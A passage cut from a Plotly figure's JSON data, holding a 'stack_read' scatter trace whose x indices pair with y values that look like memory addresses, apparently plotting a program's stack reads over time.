1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 8, 8, 8, 8], \"sizemode\": \"area\", \"sizeref\": 0.02, \"symbol\": \"circle\"}, \"mode\": \"markers\", \"name\": \"stack_read\", \"showlegend\": true, \"type\": \"scattergl\", \"x\": [2, 7, 11, 15, 19, 23, 27, 31, 35, 39, 43, 47, 51, 55, 59, 63, 67, 71, 75, 79, 83, 87, 91, 95, 99, 103, 104, 107, 108, 112, 113, 116, 117, 121, 122, 125, 126, 130, 134, 138, 139, 142, 143, 147, 148, 151, 152, 156, 157, 160, 161, 165, 169, 170, 173, 174, 178, 179, 182, 183, 187, 191, 192, 195, 196, 200, 201, 204, 205, 209, 210, 213, 214, 218, 222, 223, 226, 227, 231, 232, 235, 236, 240, 241, 244, 245, 249, 250, 253, 254, 258, 259, 262, 263, 267, 271, 275, 276, 279, 280, 284, 285, 288, 289, 293, 294, 297, 298, 302, 306, 307, 310, 311, 315, 316, 319, 320, 324, 328, 329, 332, 333, 337, 338, 341, 342, 346, 347, 350, 351, 355, 359, 360, 363, 364, 368, 369, 372, 373, 377, 378, 381, 382, 386, 387, 390, 391, 395, 396, 399, 400, 404, 408, 412, 413, 416, 417, 421, 422, 425, 426, 430, 431, 434, 435, 439, 443, 444, 447, 448, 452, 453, 456, 457, 461, 465, 466, 469, 470, 474, 475, 478, 479, 483, 484, 487, 488, 492, 496, 497, 500, 501, 505, 506, 509, 510, 514, 515, 518, 519, 523, 524, 527, 528, 532, 533, 536, 537, 541, 545, 549, 550, 553, 554, 558, 559, 562, 563, 567, 568, 571, 572, 576, 580, 581, 584, 585, 589, 590, 593, 594, 598, 602, 603, 606, 607, 611, 612, 615, 616, 620, 621, 624, 625, 629, 633, 634, 637, 638, 642, 643, 646, 647, 651, 655, 659, 663, 667, 671, 675, 679, 683, 687, 691, 695, 699, 703, 707, 711, 715, 719, 723, 727, 731, 735, 739, 743, 747, 748, 751, 752, 756, 757, 760, 761, 765, 766, 769, 770, 774, 778, 782, 783, 786, 787, 791, 792, 795, 796, 800, 801, 804, 805, 809, 813, 814, 817, 818, 822, 823, 826, 827, 831, 835, 836, 839, 840, 844, 845, 848, 849, 853, 854, 857, 858, 862, 866, 867, 870, 871, 875, 876, 879, 880, 884, 885, 888, 889, 893, 894, 897, 898, 902, 903, 906, 907, 911, 915, 919, 920, 923, 924, 928, 929, 932, 933, 937, 938, 941, 942, 946, 950, 951, 954, 955, 959, 960, 963, 964, 968, 972, 973, 976, 977, 981, 982, 985, 986, 990, 991, 994, 995, 999, 1003, 1004, 1007, 1008, 1012, 1013, 1016, 1017, 1021, 1022, 1025, 1026, 1030, 1031, 1034, 1035, 1039, 1040, 1043, 1044, 1048, 1052, 1056, 1057, 1060, 1061, 1065, 1066, 1069, 1070, 1074, 1075, 1078, 1079, 1083, 1087, 1088, 1091, 1092, 1096, 1097, 1100, 1101, 1105, 1109, 1110, 1113, 1114, 1118, 1119, 1122, 1123, 1127, 1128, 1131, 1132, 1136, 1140, 1141, 1144, 1145, 1149, 1150, 1153, 1154, 1158, 1159, 1162, 1163, 1167, 1168, 1171, 1172, 1176, 1177, 1180, 1181, 1185, 1189, 1193, 1194, 1197, 1198, 1202, 1203, 1206, 1207, 1211, 1212, 1215, 1216, 1220, 1224, 1225, 1228, 1229, 1233, 1234, 1237, 1238, 1242, 1246, 1247, 1250, 1251, 1255, 1256, 1259, 1260, 1264, 1265, 1268, 1269, 1273, 1277, 1278, 1281, 1282, 1286, 1287, 1290, 1291, 1295, 1299, 1303, 1307, 1311, 1315, 1319, 1323, 1327, 1331, 1335, 1339, 1343, 1347, 1351, 1355, 1359, 1363, 1367, 1371, 1375, 1379, 1383, 1387, 1391, 1392, 1395, 1396, 1400, 1401, 1404, 1405, 1409, 1410, 1413, 1414, 1418, 1422, 1426, 1427, 1430, 1431, 1435, 1436, 1439, 1440, 1444, 1445, 1448, 1449, 1453, 1457, 1458, 1461, 1462, 1466, 1467, 1470, 1471, 1475, 1479, 1480, 1483, 1484, 1488, 1489, 1492, 1493, 1497, 1498, 1501, 1502, 1506, 1510, 1511, 1514, 1515, 1519, 1520, 1523, 1524, 1528, 1529, 1532, 1533, 1537, 1538, 1541, 1542, 1546, 1547, 1550, 1551, 1555, 1559, 1563, 1564, 1567, 1568, 1572, 1573, 1576, 1577, 1581, 1582, 1585, 1586, 1590, 1594, 1595, 1598, 1599, 1603, 1604, 1607, 1608, 1612, 1616, 1617, 1620, 1621, 1625, 1626, 1629, 1630, 1634, 1635, 1638, 1639, 1643, 1647, 1648, 1651, 1652, 1656, 1657, 1660, 1661, 1665, 1666, 1669, 1670, 1674, 1675, 1678, 1679, 1683, 1684, 1687, 1688, 1692, 1696, 1700, 1701, 1704, 1705, 1709, 1710, 1713, 1714, 1718, 1719, 1722, 1723, 1727, 1731, 1732, 1735, 1736, 1740, 1741, 1744, 1745, 1749, 1753, 1754, 1757, 1758, 1762, 1763, 1766, 1767, 1771, 1772, 1775, 1776, 1780, 1784, 1785, 1788, 1789, 1793, 1794, 1797, 1798, 1802, 1803, 1806, 1807, 1811, 1812, 1815, 1816, 1820, 1821, 1824, 1825, 1829, 1833, 1837, 1838, 1841, 1842, 1846, 1847, 1850, 1851, 1855, 1856, 1859, 1860, 1864, 1868, 1869, 1872, 1873, 1877, 1878, 1881, 1882, 1886, 1890, 1891, 1894, 1895, 1899, 1900, 1903, 1904, 1908, 1909, 1912, 1913, 1917, 1921, 1922, 1925, 1926, 1930, 1931, 1934, 1935, 1939, 1943, 1947, 1951, 1955, 1959, 1963, 1967, 1971, 1975, 1979, 1983, 1987, 1991, 1995, 1999, 2003, 2007, 2011, 2015, 2019, 2023, 2027, 2031, 2035, 2036, 2039, 2040, 2044, 2045, 2048, 2049, 2053, 2054, 2057, 2058, 2062, 2066, 2070, 2071, 2074, 2075, 2079, 2080, 2083, 2084, 2088, 2089, 2092, 2093, 2097, 2101, 2102, 2105, 2106, 2110, 2111, 2114, 2115, 2119, 2123, 2124, 2127, 2128, 2132, 2133, 2136, 2137, 2141, 2142, 2145, 2146, 2150, 2154, 2155, 2158, 2159, 2163, 2164, 2167, 2168, 2172, 2173, 2176, 2177, 2181, 2182, 2185, 2186, 2190, 2191, 2194, 2195, 2199, 2203, 2207, 2208, 2211, 2212, 2216, 2217, 2220, 2221, 2225, 2226, 2229, 2230, 2234, 2238, 2239, 2242, 2243, 2247, 2248, 2251, 2252, 2256, 2260, 2261, 2264, 2265, 2269, 2270, 2273, 2274, 2278, 2279, 2282, 2283, 2287, 2291, 2292, 2295, 2296, 2300, 2301, 2304, 2305, 2309, 2310, 2313, 2314, 2318, 2319, 2322, 2323, 2327, 2328, 2331, 2332, 2336, 2340, 2344, 2345, 2348, 2349, 2353, 2354, 2357, 2358, 2362, 2363, 2366, 2367, 2371, 2375, 2376, 2379, 2380, 2384, 2385, 2388, 2389, 2393, 2397, 2398, 2401, 2402, 2406, 2407, 2410, 2411, 2415, 2416, 2419, 2420, 2424, 2428, 2429, 2432, 2433, 2437, 2438, 2441, 2442, 2446, 2447, 2450, 2451, 2455, 2456, 2459, 2460, 2464, 2465, 2468, 2469, 2473, 2477, 2481, 2482, 2485, 2486, 2490, 2491, 2494, 2495, 2499, 2500, 2503, 2504, 2508, 2512, 2513, 2516, 2517, 2521, 2522, 2525, 2526, 2530, 2534, 2535, 2538, 2539, 2543, 2544, 2547, 2548, 2552, 2553, 2556, 2557, 2561, 2565, 2566, 2569, 2570, 2574, 2575, 2578, 2579, 2583, 2587, 2591, 2595, 2599, 2603, 2607, 2611, 2615, 2619, 2623, 2627, 2631, 2635, 2639, 2643, 2647, 2651, 2655, 2659, 2663, 2667, 2671, 2675, 2679, 2680, 2683, 2684, 2688, 2689, 2692, 2693, 2697, 2698, 2701, 2702, 2706, 2710, 2714, 2715, 2718, 2719, 2723, 2724, 2727, 2728, 2732, 2733, 2736, 2737, 2741, 2745, 2746, 2749, 2750, 2754, 2755, 2758, 2759, 2763, 2767, 2768, 2771, 2772, 2776, 2777, 2780, 2781, 2785, 2786, 2789, 2790, 2794, 2798, 2799, 2802, 2803, 2807, 2808, 2811, 2812, 2816, 2817, 2820, 2821, 2825, 2826, 2829, 2830, 2834, 2835, 2838, 2839, 2843, 2847, 2851, 2852, 2855, 2856, 2860, 2861, 2864, 2865, 2869, 2870, 2873, 2874, 2878, 2882, 2883, 2886, 2887, 2891, 2892, 2895, 2896, 2900, 2904, 2905, 2908, 2909, 2913, 2914, 2917, 2918, 2922, 2923, 2926, 2927, 2931, 2935, 2936, 2939, 2940, 2944, 2945, 2948, 2949, 2953, 2954, 2957, 2958, 2962, 2963, 2966, 2967, 2971, 2972, 2975, 2976, 2980, 2984, 2988, 2989, 2992, 2993, 2997, 2998, 3001, 3002, 3006, 3007, 3010, 3011, 3015, 3019, 3020, 3023, 3024, 3028, 3029, 3032, 3033, 3037, 3041, 3042, 3045, 3046, 3050, 3051, 3054, 3055, 3059, 3060, 3063, 3064, 3068, 3072, 3073, 3076, 3077, 3081, 3082, 3085, 3086, 3090, 3091, 3094, 3095, 3099, 3100, 3103, 3104, 3108, 3109, 3112, 3113, 3117, 3121, 3125, 3126, 3129, 3130, 3134, 3135, 3138, 3139, 3143, 3144, 3147, 3148, 3152, 3156, 3157, 3160, 3161, 3165, 3166, 3169, 3170, 3174, 3178, 3179, 3182, 3183, 3187, 3188, 3191, 3192, 3196, 3197, 3200, 3201, 3205, 3209, 3210, 3213, 3214, 3218, 3219, 3222, 3223, 3227, 3231, 3235, 3239, 3243, 3247, 3251, 3255, 3259, 3263, 3267, 3271, 3275, 3279, 3283, 3287, 3291, 3295, 3299, 3303, 3307, 3311, 3315, 3319, 3323, 3324, 3327, 3328, 3332, 3333, 3336, 3337, 3341, 3342, 3345, 3346, 3350, 3354, 3358, 3359, 3362, 3363, 3367, 3368, 3371, 3372, 3376, 3377, 3380, 3381, 3385, 3389, 3390, 3393, 3394, 3398, 3399, 3402, 3403, 3407, 3411, 3412, 3415, 3416, 3420, 3421, 3424, 3425, 3429, 3430, 3433, 3434, 3438, 3442, 3443, 3446, 3447, 3451, 3452, 3455, 3456, 3460, 3461, 3464, 3465, 3469, 3470, 3473, 3474, 3478, 3479, 3482, 3483, 3487, 3491, 3495, 3496, 3499, 3500, 3504, 3505, 3508, 3509, 3513, 3514, 3517, 3518, 3522, 3526, 3527, 3530, 3531, 3535, 3536, 3539, 3540, 3544, 3548, 3549, 3552, 3553, 3557, 3558, 3561, 3562, 3566, 3567, 3570, 3571, 3575, 3579, 3580, 3583, 3584, 3588, 3589, 3592, 3593, 3597, 3598, 3601, 3602, 3606, 3607, 3610, 3611, 3615, 3616, 3619, 3620, 3624, 3628, 3632, 3633, 3636, 3637, 3641, 3642, 3645, 3646, 3650, 3651, 3654, 3655, 3659, 3663, 3664, 3667, 3668, 3672, 3673, 3676, 3677, 3681, 3685, 3686, 3689, 3690, 3694, 3695, 3698, 3699, 3703, 3704, 3707, 3708, 3712, 3716, 3717, 3720, 3721, 3725, 3726, 3729, 3730, 3734, 3735, 3738, 3739, 3743, 3744, 3747, 3748, 3752, 3753, 3756, 3757, 3761, 3765, 3769, 3770, 3773, 3774, 3778, 3779, 3782, 3783, 3787, 3788, 3791, 3792, 3796, 3800, 3801, 3804, 3805, 3809, 3810, 3813, 3814, 3818, 3822, 3823, 3826, 3827, 3831, 3832, 3835, 3836, 3840, 3841, 3844, 3845, 3849, 3853, 3854, 3857, 3858, 3862, 3863, 3866, 3867, 3871, 3875, 3879, 3883, 3887, 3891, 3895, 3899, 3903, 3907, 3911, 3915, 3919, 3923, 3927, 3931, 3935, 3939, 3943, 3947, 3951, 3955, 3959, 3963, 3967, 3968, 3971, 3972, 3976, 3977, 3980, 3981, 3985, 3986, 3989, 3990, 3994, 3998, 4002, 4003, 4006, 4007, 4011, 4012, 4015, 4016, 4020, 4021, 4024, 4025, 4029, 4033, 4034, 4037, 4038, 4042, 4043, 4046, 4047, 4051, 4055, 4056, 4059, 4060, 4064, 4065, 4068, 4069, 4073, 4074, 4077, 4078, 4082, 4086, 4087, 4090, 4091, 4095, 4096, 4099, 4100, 4104, 4105, 4108, 4109, 4113, 4114, 4117, 4118, 4122, 4123, 4126, 4127, 4131, 4135, 4139, 4140, 4143, 4144, 4148, 4149, 4152, 4153, 4157, 4158, 4161, 4162, 4166, 4170, 4171, 4174, 4175, 4179, 4180, 4183, 4184, 4188, 4192, 4193, 4196, 4197, 4201, 4202, 4205, 4206, 4210, 4211, 4214, 4215, 4219, 4223, 4224, 4227, 4228, 4232, 4233, 4236, 4237, 4241, 4242, 4245, 4246, 4250, 4251, 4254, 4255, 4259, 4260, 4263, 4264, 4268, 4272, 4276, 4277, 4280, 4281, 4285, 4286, 4289, 4290, 4294, 4295, 4298, 4299, 4303, 4307, 4308, 4311, 4312, 4316, 4317, 4320, 4321, 4325, 4329, 4330, 4333, 4334, 4338, 4339, 4342, 4343, 4347, 4348, 4351, 4352, 4356, 4360, 4361, 4364, 4365, 4369, 4370, 4373, 4374, 4378, 4379, 4382, 4383, 4387, 4388, 4391, 4392, 4396, 4397, 4400, 4401, 4405, 4409, 4413, 4414, 4417, 4418, 4422, 4423, 4426, 4427, 4431, 4432, 4435, 4436, 4440, 4444, 4445, 4448, 4449, 4453, 4454, 4457, 4458, 4462, 4466, 4467, 4470, 4471, 4475, 4476, 4479, 4480, 4484, 4485, 4488, 4489, 4493, 4497, 4498, 4501, 4502, 4506, 4507, 4510, 4511, 4515, 4519, 4523, 4527, 4531, 4535, 4539, 4543, 4547, 4551, 4555, 4559, 4563, 4567, 4571, 4575, 4579, 4583, 4587, 4591, 4595, 4599, 4603, 4607, 4611, 4615, 4619, 4623, 4627, 4631, 4635, 4639, 4643, 4647, 4651, 4655, 4659, 4663, 4667, 4671, 4675, 4679, 4683, 4687, 4691, 4695, 4696, 4699, 4700, 4704, 4705, 4708, 4709, 4713, 4714, 4717, 4718, 4722, 4723, 4726, 4727, 4731, 4732, 4735, 4736, 4740, 4741, 4744, 4745, 4749, 4753, 4757, 4761, 4762, 4765, 4766, 4770, 4771, 4774, 4775, 4779, 4783, 4784, 4787, 4788, 4792, 4793, 4796, 4797, 4801, 4802, 4805, 4806, 4810, 4811, 4814, 4815, 4819, 4823, 4827, 4828, 4831, 4832, 4836, 4837, 4840, 4841, 4845, 4846, 4849, 4850, 4854, 4855, 4858, 4859, 4863, 4867, 4871, 4872, 4875, 4876, 4880, 4881, 4884, 4885, 4889, 4890, 4893, 4894, 4898, 4899, 4902, 4903, 4907, 4908, 4911, 4912, 4916, 4917, 4920, 4921, 4925, 4929, 4933, 4934, 4937, 4938, 4942, 4943, 4946, 4947, 4951, 4952, 4955, 4956, 4960, 4961, 4964, 4965, 4969, 4970, 4973, 4974, 4978, 4979, 4982, 4983, 4987, 4988, 4991, 4992, 4996, 4997, 5000, 5001, 5005, 5006, 5009, 5010, 5014, 5015, 5018, 5019, 5023, 5027, 5031, 5035, 5036, 5039, 5040, 5044, 5045, 5048, 5049, 5053, 5057, 5058, 5061, 5062, 5066, 5067, 5070, 5071, 5075, 5076, 5079, 5080, 5084, 5085, 5088, 5089, 5093, 5097, 5101, 5102, 5105, 5106, 5110, 5111, 5114, 5115, 5119, 5120, 5123, 5124, 5128, 5129, 5132, 5133, 5137, 5141, 5145, 5146, 5149, 5150, 5154, 5155, 5158, 5159, 5163, 5164, 5167, 5168, 5172, 5173, 5176, 5177, 5181, 5182, 5185, 5186, 5190, 5191, 5194, 5195, 5199, 5203, 5207, 5208, 5211, 5212, 5216, 5217, 5220, 5221, 5225, 5226, 5229, 5230, 5234, 5235, 5238, 5239, 5243, 5244, 5247, 5248, 5252, 5253, 5256, 5257, 5261, 5262, 5265, 5266, 5270, 5271, 5274, 5275, 5279, 5280, 5283, 5284, 5288, 5289, 5292, 5293, 5297, 5301, 5305, 5309, 5310, 5313, 5314, 5318, 5319, 5322, 5323, 5327, 5331, 5332, 5335, 5336, 5340, 5341, 5344, 5345, 5349, 5350, 5353, 5354, 5358, 5359, 5362, 5363, 5367, 5371, 5375, 5376, 5379, 5380, 5384, 5385, 5388, 5389, 5393, 5394, 5397, 5398, 5402, 5403, 5406, 5407, 5411, 5415, 5419, 5420, 5423, 5424, 5428, 5429, 5432, 5433, 5437, 5438, 5441, 5442, 5446, 5447, 5450, 5451, 5455, 5456, 5459, 5460, 5464, 5465, 5468, 5469, 5473, 5477, 5481, 5482, 5485, 5486, 5490, 5491, 5494, 5495, 5499, 5500, 5503, 5504, 5508, 5509, 5512, 5513, 5517, 5518, 5521, 5522, 5526, 5527, 5530, 5531, 5535, 5536, 5539, 5540, 5544, 5545, 5548, 5549, 5553, 5554, 5557, 5558, 5562, 5563, 5566, 5567, 5571, 5575, 5579, 5583, 5584, 5587, 5588, 5592, 5593, 5596, 5597, 5601, 5605, 5606, 5609, 5610, 5614, 5615, 5618, 5619, 5623, 5624, 5627, 5628, 5632, 5633, 5636, 5637, 5641, 5645, 5649, 5650, 5653, 5654, 5658, 5659, 5662, 5663, 5667, 5668, 5671, 5672, 5676, 5677, 5680, 5681, 5685, 5689, 5693, 5694, 5697, 5698, 5702, 5703, 5706, 5707, 5711, 5712, 5715, 5716, 5720, 5721, 5724, 5725, 5729, 5730, 5733, 5734, 5738, 5739, 5742, 5743, 5747, 5751, 5755, 5756, 5759, 5760, 5764, 5765, 5768, 5769, 5773, 5774, 5777, 5778, 5782, 5783, 5786, 5787, 5791, 5795, 5799, 5803, 5807, 5811, 5815, 5819, 5823, 5827, 5831, 5835, 5839, 5843, 5847, 5851, 5855, 5859, 5863, 5867, 5871, 5875, 5879, 5883, 5887, 5891, 5895, 5899, 5903, 5907, 5911, 5915, 5919, 5923, 5927, 5931, 5935, 5939, 5943, 5947, 5951, 5955, 5959, 5963, 5967, 5971, 5975, 5979, 5983, 5984, 5987, 5988, 5992, 5993, 5996, 5997, 6001, 6002, 6005, 6006, 6010, 6011, 6014, 6015, 6019, 6020, 6023, 6024, 6028, 6029, 6032, 6033, 6037, 6041, 6045, 6049, 6050, 6053, 6054, 6058, 6059, 6062, 6063, 6067, 6071, 6072, 6075, 6076, 6080, 6081, 6084, 6085, 6089, 6090, 6093, 6094, 6098, 6099, 6102, 6103, 6107, 6111, 6115, 6116, 6119, 6120, 6124, 6125, 6128, 6129, 6133, 6134, 6137, 6138, 6142, 6143, 6146, 6147, 6151, 6155, 6159, 6160, 6163, 6164, 6168, 6169, 6172, 6173, 6177, 6178, 6181, 6182, 6186, 6187, 6190, 6191, 6195, 6196, 6199, 6200, 6204, 6205, 6208, 6209, 6213, 6217, 6221, 6222, 6225, 6226, 6230, 6231, 6234, 6235, 6239, 6240, 6243, 6244, 6248, 6249, 6252, 6253, 6257, 6258, 6261, 6262, 6266, 6267, 6270, 6271, 6275, 6276, 6279, 6280, 6284, 6285, 6288, 6289, 6293, 6294, 6297, 6298, 6302, 6303, 6306, 6307, 6311, 6315, 6319, 6323, 6324, 6327, 6328, 6332, 6333, 6336, 6337, 6341, 6345, 6346, 6349, 6350, 6354, 6355, 6358, 6359, 6363, 6364, 6367, 6368, 6372, 6373, 6376, 6377, 6381, 6385, 6389, 6390, 6393, 6394, 6398, 6399, 6402, 6403, 6407, 6408, 6411, 6412, 6416, 6417, 6420, 6421, 6425, 6429, 6433, 6434, 6437, 6438, 6442, 6443, 6446, 6447, 6451, 6452, 6455, 6456, 6460, 6461, 6464, 6465, 6469, 6470, 6473, 6474, 6478, 6479, 6482, 6483, 6487, 6491, 6495, 6496, 6499, 6500, 6504, 6505, 6508, 6509, 6513, 6514, 6517, 6518, 6522, 6523, 6526, 6527, 6531, 6532, 6535, 6536, 6540, 6541, 6544, 6545, 6549, 6550, 6553, 6554, 6558, 6559, 6562, 6563, 6567, 6568, 6571, 6572, 6576, 6577, 6580, 6581, 6585, 6589, 6593, 6597, 6598, 6601, 6602, 6606, 6607, 6610, 6611, 6615, 6619, 6620, 6623, 6624, 6628, 6629, 6632, 6633, 6637, 6638, 6641, 6642, 6646, 6647, 6650, 6651, 6655, 6659, 6663, 6664, 6667, 6668, 6672, 6673, 6676, 6677, 6681, 6682, 6685, 6686, 6690, 6691, 6694, 6695, 6699, 6703, 6707, 6708, 6711, 6712, 6716, 6717, 6720, 6721, 6725, 6726, 6729, 6730, 6734, 6735, 6738, 6739, 6743, 6744, 6747, 6748, 6752, 6753, 6756, 6757, 6761, 6765, 6769, 6770, 6773, 6774, 6778, 6779, 6782, 6783, 6787, 6788, 6791, 6792, 6796, 6797, 6800, 6801, 6805, 6806, 6809, 6810, 6814, 6815, 6818, 6819, 6823, 6824, 6827, 6828, 6832, 6833, 6836, 6837, 6841, 6842, 6845, 6846, 6850, 6851, 6854, 6855, 6859, 6863, 6867, 6871, 6872, 6875, 6876, 6880, 6881, 6884, 6885, 6889, 6893, 6894, 6897, 6898, 6902, 6903, 6906, 6907, 6911, 6912, 6915, 6916, 6920, 6921, 6924, 6925, 6929, 6933, 6937, 6938, 6941, 6942, 6946, 6947, 6950, 6951, 6955, 6956, 6959, 6960, 6964, 6965, 6968, 6969, 6973, 6977, 6981, 6982, 6985, 6986, 6990, 6991, 6994, 6995, 6999, 7000, 7003, 7004, 7008, 7009, 7012, 7013, 7017, 7018, 7021, 7022, 7026, 7027, 7030, 7031, 7035, 7039, 7043, 7044, 7047, 7048, 7052, 7053, 7056, 7057, 7061, 7062, 7065, 7066, 7070, 7071, 7074, 7075, 7079, 7083, 7087, 7091, 7095, 7099, 7103, 7107, 7111, 7115, 7119, 7123, 7127, 7131, 7135, 7139, 7143, 7147, 7151, 7155, 7159, 7163, 7167, 7171, 7175, 7179, 7183, 7187, 7191, 7195, 7199, 7203, 7207, 7211, 7215, 7219, 7223, 7227, 7231, 7235, 7239, 7243, 7247, 7251, 7255, 7259, 7263, 7267, 7271, 7272, 7275, 7276, 7280, 7281, 7284, 7285, 7289, 7290, 7293, 7294, 7298, 7299, 7302, 7303, 7307, 7311, 7315, 7316, 7319, 7320, 7324, 7325, 7328, 7329, 7333, 7334, 7337, 7338, 7342, 7343, 7346, 7347, 7351, 7355, 7359, 7360, 7363, 7364, 7368, 7369, 7372, 7373, 7377, 7378, 7381, 7382, 7386, 7387, 7390, 7391, 7395, 7399, 7403, 7404, 7407, 7408, 7412, 7413, 7416, 7417, 7421, 7422, 7425, 7426, 7430, 7431, 7434, 7435, 7439, 7443, 7447, 7448, 7451, 7452, 7456, 7457, 7460, 7461, 7465, 7466, 7469, 7470, 7474, 7475, 7478, 7479, 7483, 7487, 7491, 7492, 7495, 7496, 7500, 7501, 7504, 7505, 7509, 7510, 7513, 7514, 7518, 7519, 7522, 7523, 7527, 7531, 7535, 7536, 7539, 7540, 7544, 7545, 7548, 7549, 7553, 7554, 7557, 7558, 7562, 7563, 7566, 7567, 7571, 7575, 7579, 7580, 7583, 7584, 7588, 7589, 7592, 7593, 7597, 7598, 7601, 7602, 7606, 7607, 7610, 7611, 7615, 7619, 7623, 7624, 7627, 7628, 7632, 7633, 7636, 7637, 7641, 7642, 7645, 7646, 7650, 7651, 7654, 7655, 7659, 7663, 7667, 7668, 7671, 7672, 7676, 7677, 7680, 7681, 7685, 7686, 7689, 7690, 7694, 7695, 7698, 7699, 7703, 7707, 7711, 7712, 7715, 7716, 7720, 7721, 7724, 7725, 7729, 7730, 7733, 7734, 7738, 7739, 7742, 7743, 7747, 7751, 7755, 7756, 7759, 7760, 7764, 7765, 7768, 7769, 7773, 7774, 7777, 7778, 7782, 7783, 7786, 7787, 7791, 7795, 7799, 7800, 7803, 7804, 7808, 7809, 7812, 7813, 7817, 7818, 7821, 7822, 7826, 7827, 7830, 7831, 7835, 7839, 7843, 7844, 7847, 7848, 7852, 7853, 7856, 7857, 7861, 7862, 7865, 7866, 7870, 7871, 7874, 7875, 7879, 7883, 7887, 7888, 7891, 7892, 7896, 7897, 7900, 7901, 7905, 7906, 7909, 7910, 7914, 7915, 7918, 7919, 7923, 7927, 7931, 7932, 7935, 7936, 7940, 7941, 7944, 7945, 7949, 7950, 7953, 7954, 7958, 7959, 7962, 7963, 7967, 7971, 7975, 7976, 7979, 7980, 7984, 7985, 7988, 7989, 7993, 7994, 7997, 7998, 8002, 8003, 8006, 8007, 8011, 8012, 8015, 8016, 8020, 8021, 8024, 8025, 8029, 8030, 8033, 8034, 8038, 8039, 8042, 8043, 8047, 8048, 8051, 8052, 8056, 8057, 8060, 8061, 8065, 8066, 8069, 8070, 8074, 8075, 8078, 8079, 8083, 8084, 8087, 8088, 8092, 8093, 8096, 8097, 8101, 8102, 8105, 8106, 8110, 8111, 8114, 8115, 8119, 8120, 8121, 8124, 8125], \"xaxis\": \"x\", \"y\": [140224210382664, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382688, 140224210382676, 140224210382689, 140224210382680, 140224210382690, 140224210382684, 140224210382691, 140224210382672, 140224210382673, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382674, 140224210382675, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382672, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382673, 140224210382690, 140224210382673, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382674, 140224210382675, 140224210382689, 140224210382675, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382675, 140224210382690, 140224210382675, 140224210382676, 140224210382677, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382678, 140224210382679, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382676, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382676, 140224210382677, 140224210382678, 140224210382677, 140224210382678, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382677, 140224210382690, 140224210382677, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382678, 140224210382679, 140224210382689, 140224210382679, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382679, 140224210382690, 140224210382679, 140224210382680, 140224210382681, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382682, 140224210382683, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382680, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382680, 140224210382681, 140224210382682, 140224210382681, 140224210382682, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382681, 140224210382690, 140224210382681, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382682, 140224210382683, 140224210382689, 140224210382683, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382683, 140224210382690, 140224210382683, 140224210382684, 140224210382685, 140224210382684, 140224210382685, 140224210382686, 140224210382687, 140224210382686, 140224210382687, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382684, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382684, 140224210382685, 140224210382686, 140224210382685, 140224210382686, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382685, 140224210382690, 140224210382685, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382686, 140224210382687, 140224210382689, 140224210382687, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382687, 140224210382690, 140224210382687, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382688, 140224210382676, 140224210382689, 140224210382680, 140224210382690, 140224210382684, 140224210382691, 140224210382672, 140224210382673, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382674, 140224210382675, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382672, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382673, 140224210382690, 140224210382673, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382674, 